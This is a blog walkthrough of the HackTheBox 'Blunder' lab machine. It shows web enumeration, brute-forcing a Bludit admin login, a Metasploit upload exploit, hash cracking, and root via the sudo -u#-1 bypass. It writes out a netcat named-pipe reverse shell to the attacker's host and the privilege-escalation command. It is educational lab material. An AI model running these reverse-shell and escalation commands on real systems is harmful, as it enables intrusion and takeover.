---
layout: post
title: "HackTheBox - Blunder"
description: "Walkthrough of Blunder box on Hackthebox."
thumb_image: "documentation/blunderthumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/blunder.webp"
path-detail="documentation/blunder.webp"
alt="HTB Blunder" %}

## HTB - Blunder

IP - 10.10.10.191

### Overview

This box was an easy level linux box on HTB created by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858), it started with discovering a `todo.txt` file on the webserver which had a username `fergus`, we use that username to bruteforce using the passlist created from the website using `cewl` into the `admin` pannel of `bludit`. We use these auth creds in `Metasploit` exploit `exploit/linux/http/bludit_upload_images_exec` to get a shell on the server. On enumerating the box we find a newer version of `bludit` on the box which has the hashed password of user `hugo`, after cracking it we can get the access as user `Hugo`. Root is based on a `sudo` vulnerability was the easiest part of the box.

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
nmap -sC -sV -oA nmap/results 10.10.10.191
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
# Nmap 7.80 scan initiated Mon Jun  1 00:33:39 2020 as: nmap -sC -sV -o nmap_results 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.78s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 00:35:13 2020 -- 1 IP address (1 host up) scanned in 94.25 seconds
{% endhighlight %}

Intresting, only one port open. Alright let’s run an all port scan `nmap -p- -T4 10.10.10.191` and start enumerating the websever.

#### Enumerating the web server

{% include image.html path="documentation/blunderwebserver.webp"
path-detail="documentation/blunderwebserver.webp"
alt="HTB Blunder" %}

About section has a note `I created this site to dump my fact files, nothing more.......?`, did some basic enum like checking for `robots.txt`, reading source code but got nothing. So let’s start a gobuster scan for directory fuzzing.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
└──╼ $gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_result -t 120
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        120
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/10/17 17:31:28 Starting gobuster
===============================================================
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/install.php (Status: 200)
/robots.txt (Status: 200)
/usb (Status: 200)
/todo.txt (Status: 200)
===============================================================
{% endhighlight %} 

`todo.txt` and `admin` page looks interesting, checking out the `todo.txt` file first.

{% include image.html path="documentation/blundertodo.webp"
path-detail="documentation/blundertodo.webp"
alt="HTB Blunder" %}

`fergus` looks like a username. <br>
Let’s check the `/admin` pannel.

{% include image.html path="documentation/blunderadmin.webp"
path-detail="documentation/blunderadmin.webp"
alt="HTB Blunder" %}

`Bludit` is a `CMS` and searching `Bludit` in `metasploit` gives us a RCE exploit but it needs the authentication creds of admin pannel.

#### Foothold

Time to analyse what information we have gathered so far. First a username `fergus`, Second a `metasploit exploit module` for bludit that can give us `RCE` but needs authentication creds. Also the note in website’s about section `I created this site to dump my fact files, nothing more.......?`, so it can be assumed we need to brute force creds of user `fergus` and the password might be any word in the website as it is to dump fact files of the user. _NGL.. I had a hard time figuring out that we need the wordlist created from the website to bruteforce._

Creating the wordlist.
{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
└──╼ $cewl http://10.10.10.191 > wordlist.txt
{% endhighlight %} 

Bruteforcing the /admin page using the creds will give us the creds `fergus:RolandDeschain`.<br>
Now let’s use `metasploit` to get a shell on the box. _You can also do it manually exploit but I was a beginner when I did this box first time so I used metasploit for it._

Finding the exploit

{% highlight bash %}
msf6 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
{% endhighlight %} 

Now you can use `show exploit` to list all options in the exploit, we need to set bludit’s user and password, it can be simply done by `set BLUDITUSER fergus` and `set BLUDITPASS RolandDeschain`. Similarly set the value of RHOST, LHOST and LPORT. _My configuration looked like this after setting the values._

{% highlight bash %}
Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.10      yes       The listen address (an interface may be specified)
   LPORT  9889             yes       The listen port
[Redacted]
{% endhighlight %} 

After setting things up, simply type `exploit` or `run`.

{% highlight bash %}
msf6 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.10:9889 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading WlFeAwiWEb.png...
[*] Uploading .htaccess...
[*] Executing WlFeAwiWEb.png...
[*] Sending stage (39189 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.10:9889 -> 10.10.10.191:54674) at 2020-10-17 18:15:18 +0530
[+] Deleted .htaccess

meterpreter > getuid
Server username: www-data (33)
{% endhighlight %} 

Alright we got a shell on the server as user `www-data`.

### Getting User

During basic enumeration I found a file `user.php` in `/var/www/bludit-3.9.2/bl-content/databases` which had password of users but it was a rabbit hole as those passwords were encrypted with a salt. but on enumerating more in `/var/www` we can found an newer version of bludit `bludit-3.10.0a` and the password’s in newer version’s `user.php` aren’t salted.

{% highlight bash %}
meterpreter > cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        [REDACTED]
}
{% endhighlight %} 

Throwing the hash `faca404fd5c0a31cf1897b823c695c85cffeb98d` in crackstation gives us user Hugo’s password - `Password120`. To get a shell from meterpreter use shell command and then use `su Hugo` and give the password `Password120` and we got our user.

You can directly jump to [root part](https://fumenoid.github.io/posts/htb-blunder#rooting-the-box)..<br>
I am covering an issue I faced during this box… IDK why but my meterpreter was messing up when I used shell command, maybe I used a wrong payload. So I executed a nc reverse shell command and got another shell nc. _yes I could have changed the meterpreter payload and reused bludit exploit._

{% include image.html path="documentation/blundermeta.webp"
path-detail="documentation/blundermeta.webp"
alt="HTB Blunder" %}

I tried `nc 10.10.14.10 9001 -e /bin/bash` it didn’t work, So i used this nc revershell command to get a revshell.

{% highlight bash %}
meterpreter > execute -f 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f' -H 
Process 4585 created.
meterpreter > 
{% endhighlight %} 

Netcat listner

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
└──╼ $rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.191] 49942
/bin/sh: 0: cant access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@blunder:/$ su hugo
su hugo
Password: Password120

hugo@blunder:/$ cd
cd
hugo@blunder:~$ wc -c user.txt
wc -c user.txt
33 user.txt
{% endhighlight %} 

### Rooting the box

As we have user’s `Hugo` password, check if we have any sudo perms.

{% highlight bash %}
hugo@blunder:/tmp$ sudo -l
sudo -l
Password: Password120
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
{% endhighlight %} 

It reminded me of a `sudo` vulnerability, as I did something similar in a THM room (It could have been easily discovered using any enum script like linpeas too..), so checking the sudo version.

{% highlight bash %}
hugo@blunder:/tmp$ sudo -V
sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
{% endhighlight %} 

Simply Googling `sudo 1.8.25p1 exploit`, led us to this [exploit](https://www.exploit-db.com/exploits/47502). If you read the exploit the perms match our current `sudo -l` perms.

{% highlight bash %}
hugo@blunder:/$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120
root@blunder:/# whoami
whoami
root
root@blunder:/# cd /root
cd /root
root@blunder:/root# wc -c root.txt
wc -c root.txt
33 root.txt
root@blunder:/root
{% endhighlight %} 

#### Extra

If you read the `todo.txt` file properly.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
└──╼ $cat todo.txt 
- Update the CMS
- Turn off FTP - DONE
- Remove old users - DONE
- Inform fergus that the new blog needs images - PENDING
{% endhighlight %} 

There are 3 hints in it.
1. username - `fergus`
2. `new blog needs images` - The bludit exploit was actually due to some vuln related to images(hint for guys who manually exploited it instead of metasploit exploit)
3. `Update the CMS` - The box had two bludit version and we got the password for user in updated version.

Always read `TODO notes` properly.

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.

